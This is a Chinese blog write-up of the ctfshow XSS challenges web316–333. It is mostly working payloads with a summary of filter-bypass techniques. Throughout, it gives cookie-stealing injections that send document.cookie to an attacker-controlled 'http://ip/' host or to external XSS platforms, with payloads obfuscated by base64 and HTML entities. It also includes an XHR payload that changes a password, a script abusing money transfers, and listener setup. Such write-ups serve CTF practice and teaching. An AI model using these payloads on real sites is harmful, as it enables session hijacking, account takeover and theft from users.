---
uuid: 5d776e51-2639-f251-c346-921c60f91725
title: xss
date: 2022-03-24 18:36:20
tags:
    - Web
    - xss
categories:
    - [Web]
    - [CTF]
---
ctfshow里面的xss刷题记录(有xss弹窗，建议若要点开请先关闭浏览器弹窗授权)
<!--more-->

# web316

这道题先测试一下

![image-20220713120540614](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131205683.png?x-oss-process=hzy)

存在xss漏洞，毕竟是第一题，应该没有任何过滤，直接打cookie即可！[XSS平台](https://xss.pt/)在这个平台里面

记录可用的姿势：

> img
>
> `<script>
> var img=document.createElement("img"); img.src="http://ip/"+document.cookie;
> </script>`
>
>
> 直接创建img标签的话，比如这样`<img src="http://ip:39543/"+document.cookie />`不行，这里识别不到document.cookie，套一层`<script></script>`也不行。
>
> 还有其他外带姿势
>
> window.open
>
> `<script>window.open('http://ip/'+document.cookie)</script>`
>
> `<script>window.location.href='http://ip/'+document.cookie</script>`
>
> `<script>location.href='http://ip/'+document.cookie</script>`
>
> input也可以，但是要加上autofocus
>
> `<input onfocus="window.open('http://ipx/'+document.cookie)" autofocus>`

> 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发

> svg标签
>
> `<svg onload="window.open('http://ip/'+document.cookie)">`

>
> iframe标签
>
> `<iframe onload="window.open('http://ip/'+document.cookie)"></iframe>`

> body标签
>
> `<body onload="window.open('http://ip/'+document.cookie)">`

正常的vps需要nc，但是nc好像不能持续接收，但是方法有很多，可以重复起nc，也可以写个python然后起一个临时的服务器，接收一下get参数

```
python3 -m http.server 39543
```

这道题直接上传标准形式即可！

![image-20220324192000984](https://img-blog.csdnimg.cn/img_convert/4dccf0b5217a4aa0caf2f733a56907e1.png)

显示不是管理员没有flag

换一个，用一个url一次编码的

> ```
> %26lt%3B%2FtExtArEa%26gt%3B%26%23039%3B%26quot%3B%26gt%3B%26lt%3BsCRiPt%20sRC%3Dhttps%3A%2F%2Fxss.pt%2Frxab%26gt%3B%26lt%3B%2FsCrIpT%26gt%3B 
> ```
>

![image-20220325104330643](https://img-blog.csdnimg.cn/img_convert/78fa0aa22d544ede48319bb58a34d750.png)

得到flag!

> 还有另一种方法，进行监听日志！
>
> `<script>window.open('http://ip/'+document.cookie)</script>`

![image-20220402122311481](https://img-blog.csdnimg.cn/img_convert/4a823f15884b24bbb418f2c9dbb5e9aa.png)

# web317

![image-20220325105741041](https://img-blog.csdnimg.cn/img_convert/0b1de4927bff18c0048789cbbf40b6a1.png)

还是这样的界面，只不过已经开始过滤了，问题不大，过滤哪个就不用哪个，换成其他代码一样的步骤

> 测试了一下过滤了script，使用img标签！
>
> `'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly94c3N5ZS5jb20veDNUdyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>`

![image-20220325115249559](https://img-blog.csdnimg.cn/img_convert/7e950a5575d50083331a4adfcf7a66db.png)

> 成功反弹，但是还是不能成为ADMIN，尝试一下用
>
> `<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#120;&#115;&#115;&#121;&#101;&#46;&#99;&#111;&#109;&#47;&#120;&#51;&#84;&#119;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>`

得到flag

![image-20220325120033561](https://img-blog.csdnimg.cn/img_convert/364adb6edf98f67fb4a2910e2f0b0362.png)

> <iframe> - HTML（超文本标记语言） | MDN (mozilla.org)

# web318

这道题增加了过滤，查询得到这道题过滤了img标签

> img标签也被过滤了，可以用body标签，这个标签不容易被ban
>
> `<body onload=alert(0)></body>`，成功回显。

- > 过滤img，用xss平台的实体十六进制编码
  >
  > `<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x20;&#x73;&#x52;&#x43;&#x3D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x78;&#x73;&#x73;&#x79;&#x65;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x71;&#x79;&#x52;&#x43;&#x22;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E;>`

# web319

> 这道题同上，没用过滤iframe
>
> `<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#120;&#115;&#115;&#121;&#101;&#46;&#99;&#111;&#109;&#47;&#113;&#121;&#82;&#67;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>`

# web320

> > - 过滤了空格可以换%09制表符或者/来代替
> >
> > `<iframe/WIDTH=0/HEIGHT=0/srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#120;&#115;&#115;&#121;&#101;&#46;&#99;&#111;&#109;&#47;&#113;&#121;&#82;&#67;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>`
>
> 
>
> ```
> <body/onload=document.location='http://ip/cookie.php?cookie='+document.cookie;>
> ```
>
> ```
> <body	onload=document.location='http://ip/'+document.cookie;>
> ```
>
> ![image-20220402122852006](https://img-blog.csdnimg.cn/img_convert/862b2de7572eb591f2925be7acdf5688.png)
>

# web321-326

![image-20220402123046302](https://img-blog.csdnimg.cn/img_convert/d38a61617689373d8b27d09d6a127f93.png)

过滤的不影响payload，通杀！

# web327

储存型xss

![image-20220402123835826](https://img-blog.csdnimg.cn/img_convert/a4ff8789c836a193375282a828f5e542.png)

还用上一题的方法还是可！

![image-20220402124001064](https://img-blog.csdnimg.cn/img_convert/05f88a3ad1f645ab67ca2881171808f6.png)

# web328

![image-20220402124148083](https://img-blog.csdnimg.cn/img_convert/e2446c8487517bff1d380ac7d53f7e47.png)

> 先注册一个用户
>
> ![image-20220719144948985](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191449031.png?x-oss-process=hzy)
>
> ![image-20220402124657195](https://img-blog.csdnimg.cn/img_convert/d6009a561b7aaad7007a941b6fca52f2.png)
>

盗取到cookie！

![image-20220402125657138](https://img-blog.csdnimg.cn/img_convert/ba3b8ac3973c0c9f96199fbd13e2c42c.png)

替换cookie，成为admin

![image-20220402125734783](https://img-blog.csdnimg.cn/img_convert/d5d52dae67f0f54ee5f84a3feb62b848.png)

# web329

> 查资料发现从这题开始，cookie都是短时的，截获的的cookie都会失效！
>
> ![image-20220719144910338](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191449392.png?x-oss-process=hzy)

可以看到截获的cookie在不断变化，同时都是无法正常使用的

![image-20220402130147887](https://img-blog.csdnimg.cn/img_convert/365b3c04fcf5491f8e331c74081b191e.png)

最后神奇的出来了cookie!

# web330

> ![image-20220402130326741](https://img-blog.csdnimg.cn/img_convert/e35cf9b56fd28cf752cecc5fe25d78e2.png)
>
> ![image-20220719144602659](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191446704.png?x-oss-process=hzy)
>
> 使用bp抓包修改密码
>

![image-20220402130743241](https://img-blog.csdnimg.cn/img_convert/07ac1f35a2c605d958b13c901a9cef74.png)



进入admin，得到flag

![image-20220402131335454](https://img-blog.csdnimg.cn/img_convert/656dd6ad6a090a79483287a1605b8cc9.png)

# web331

![image-20220402131620821](https://img-blog.csdnimg.cn/img_convert/f265baa2214e234886bc617388f5e68d.png)

这里发现变成了post请求，用window.open肯定不行了

查一下javascript如何发送Http请求

```
var httpRequest = new XMLHttpRequest();//第一步：创建需要的对象
httpRequest.open('POST', 'url', true); //第二步：打开连接
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）
httpRequest.send('name=teswe&ee=ef');//发送请求 将情头体写在send中
/**
 * 获取数据后的处理程序
 */
httpRequest.onreadystatechange = function () {//请求后的回调接口，可将请求成功后要执行的程序写在其中
    if (httpRequest.readyState == 4 && httpRequest.status == 200) {//验证请求是否发送成功
        var json = httpRequest.responseText;//获取到服务端返回的数据
        console.log(json);
    }
};
```

用这个，在注册页payload

<script>var httpRequest = new XMLHttpRequest();httpRequest.open('POST', 'http://127.0.0.1/api/change.php', true);httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpRequest.send('p=123456');</script>

登录admin即可!

![image-20220402132814339](https://img-blog.csdnimg.cn/img_convert/3ce9ee34e91d98eee2dac1026d9cba94.png)

# web332

![image-20220402132917124](https://img-blog.csdnimg.cn/img_convert/2ffd88d7f28cdfca897e5cc2282bd8a6.png)

注册用户，然后给admin转账-100000也就是自己多了100000

![image-20220402133010578](https://img-blog.csdnimg.cn/img_convert/f5f3285a5a58cfcbbe45f3baadd6bd29.png)

![image-20220402133018491](https://img-blog.csdnimg.cn/img_convert/881b517a931ceacc29117d8d1165f71f.png)

![image-20220402133025907](https://img-blog.csdnimg.cn/img_convert/4d6ab59605d1ffa29831747853659331.png)

# web333

这道题是不能向其他账户转账的，只能向自己转账，且只能转低于自己现有钱的数目，比如现在有5块，那么最多只能转5块，接下来的就慢慢跑到10000即可，用burp可以跑：

![image-20220402133425766](https://img-blog.csdnimg.cn/img_convert/a5ac34557fc4c708702df1722816f311.png)

写个脚本也可以

```
import requests
import re
import time
x=5
url="http://93a2a39e-623a-4cc6-bea3-6e43db483fd7.challenge.ctf.show/api/amount.php"
url2="http://93a2a39e-623a-4cc6-bea3-6e43db483fd7.challenge.ctf.show/api/getFlag.php"
headers={'Cookie':'PHPSESSID=g4fohb8r0onc7p66qf4oasoh0l'}  #自己登录后的sessionid
while True:
	print(x)
	t=x-1
	data={
	'u':'000', #注册的用户名
	'a':str(t)
	}
	r=requests.post(url,headers=headers,data=data)
	print(r.text)
	if(x>10000):
		r2=requests.get(url2,headers=headers)
		print(r2.text)
		break
	x+=t

```

![image-20220402134524351](https://img-blog.csdnimg.cn/img_convert/7a88483b59f99f8ba8767096f2a6f620.png)

# 总结

## 无任何过滤情况下的XSS

当没有过滤发生时，可以的XSSpayload就太多了，包括但不限于：

```javascript
<script>：
<script>alert(1);</script>

<body>：
<body onload=alert(1);>

<img>：
<img src='' onerror=alert(1);>

<svg>：
<svg onload=alert(1);>

<iframe>：
<iframe onload=alert(1);></iframe>

<video>：
<video><source onerror=alert(1);>

<audio>：
<audio src='' onerror=alert(1);>
```

## 过滤空格的情况

当发现题目过滤了空格的时候，就可以用`/`去绕过空格
比如：

```javascript
<body/onload=alert(1);>
```

## 过滤了关键字

## 大小写绕过

当过滤了像img这样的关键字时，可以尝试去用大小写去绕过：

```javascript
<ImG sRc='' OnErroR=alert(1);>
```

## 双写绕过

或者可以用双写绕过：（当waf是只匹配一次，且替换为空时可以双写）

```javascript
<imimgg srsrcc='' onerror=alert(1);>
```

## 拼接绕过

也可以用eval或者top来进行拼接

```javascript
<img src='' onerror="a='aler';b='t';c='(1);';eval(a+b+c)">

<img src='' onerror=top["ale"+"rt"](1);>
```

## 编码绕过：

> 可以用unicode编码绕过
>
> ```javascript
> <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">
> 
> <img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
> ```
>
> url编码
>
> ```javascript
> <img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
> <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
> ```
>
> Ascii码绕过
>
> ```javascript
> <img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
> ```
>
> hex绕过
>
> ```javascript
> <img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
> ```
>
> 八进制绕过
>
> ```javascript
> <img src=x onerror=alert('\170\163\163')>
> ```
>
> base64绕过
>
> ```javascript
> <img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
> <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
> ```
>
> > 对于xss中用服务器查看日志也做一下记录
> >
> > 服务器中用到的apache，刚开始开启apache
> >
> > `service apache2 start`
> >
> > `cd /var/log/apache2`
> >
> > 日志一般都在access.log里面
> >
> > 对于过滤不严或者没有过滤的直接用
> >
![image-20220719144511252](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191445301.png?x-oss-process=hzy)

> > 即可进行监听并查看日志得到关键信息



参考：

[通过CTFSHOW来粗略学习XSS - o3Ev的小家](http://blog.o3ev.cn/yy/224#menu_index_9)

[Y0ng的博客 (yongsheng.site)](http://www.yongsheng.site/2021/04/20/ctfshow web入门(xss)/)

 [CTFSHOW\]XSS入门(佛系记录)_Y4tacker的博客-CSDN博客_ctfshow web入门xss](https://y4tacker.blog.csdn.net/article/details/111568030)
